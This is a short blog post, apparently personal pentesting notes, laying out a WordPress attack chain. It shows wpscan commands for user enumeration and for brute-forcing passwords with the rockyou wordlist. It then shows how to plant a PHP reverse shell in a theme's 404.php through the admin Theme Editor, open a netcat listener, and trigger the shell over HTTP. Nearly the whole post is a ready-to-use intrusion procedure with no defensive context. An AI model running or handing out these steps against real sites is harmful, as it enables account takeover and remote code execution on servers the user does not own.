---
layout: post
title:  "webapp attacks - wordpress"
date:   2022-01-01
categories: web
---

## Enumeration

```bash

wpscan --rua -e --url http://<ip>:<port>/<uri>/

```

## Brute force

```bash

wpscan --rua --url http://<ip>:<port>/<uri>/ -P /usr/share/wordlists/rockyou.txt -U user

```

## Reverse Shell

```

Login -> Appearance -> Theme Editor -> Twenty Seventeen: 404 Template (404.php)

Change the content of the 404.php with this : /usr/share/webshells/php/php-reverse-shell.php

Listener: nc -nlvp 4444

Trigger the Reverse Shell : http://<ip>:<port>/<uri>/wp-content/themes/twentyseventeen/404.php

```

